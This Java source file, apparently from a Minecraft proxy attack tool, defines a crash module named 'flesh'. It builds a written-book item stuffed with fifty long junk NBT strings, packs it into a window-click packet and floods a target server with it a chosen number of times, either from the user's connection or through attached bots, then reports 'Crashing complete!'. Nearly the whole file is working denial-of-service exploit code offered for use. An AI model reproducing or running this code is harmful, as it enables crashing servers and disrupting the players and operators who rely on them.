package pl.venixpll.system.crash.impl;

import lombok.SneakyThrows;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import pl.venixpll.mc.data.game.WindowAction;
import pl.venixpll.mc.data.item.ItemStack;
import pl.venixpll.mc.objects.Player;
import pl.venixpll.mc.packet.Packet;
import pl.venixpll.mc.packet.impl.client.play.ClientPlayerWindowActionPacket;
import pl.venixpll.system.crash.Crash;
import pl.venixpll.system.crash.CrashType;

import java.util.List;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class CrashFlesh extends Crash {
    private Packet packet;

    public CrashFlesh() {
        super("flesh", CrashType.NBT);
    }

    @SneakyThrows
    @Override
    public void init() {

        final NBTTagCompound compound = new NBTTagCompound();

        final List<NBTBase> list = IntStream.range(0, 50)
                .mapToObj(ia -> new NBTTagString("wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5"))
                .collect(Collectors.toList());

        final NBTTagList pages = new NBTTagList();
        list.forEach(pages::appendTag);

        compound.setTag("pages", pages);
        compound.setTag("title", new NBTTagString("ttProxy6146"));
        compound.setTag("author", new NBTTagString("JZ9SNxES"));

        final ItemStack stack = new ItemStack(386, 1, 0, compound);

        this.packet = new ClientPlayerWindowActionPacket(0, (short) 20, 0, WindowAction.CLICK_ITEM, 0, stack);
    }

    @Override
    public void execute(String message, Player sender) {

        if (packet == null) {
            sender.sendChatMessage("&cFailed to initialize crash!");
            return;
        }

        try {
            final String[] args = message.split(" ");
            final int amount = Integer.parseInt(args[2]);
            if (sender.getBots().size() == 0) {
                IntStream.range(0, amount).forEach(i -> sender.getConnector().sendPacket(packet));
                sender.sendChatMessage("&aCrashing complete! &8(&6USER&8)");
            } else {
                sender.getBots().forEach(b -> IntStream.range(0, amount).forEach(i -> b.getConnection().sendPacket(packet)));
                sender.sendChatMessage("&aCrashing complete! &8(&6BOTS&8)");
            }
        } catch (final Throwable t) {
            sender.sendChatMessage("&cError occured during crashing! &8(&6" + t.getClass().getSimpleName() + "&8)");
        }
    }
}
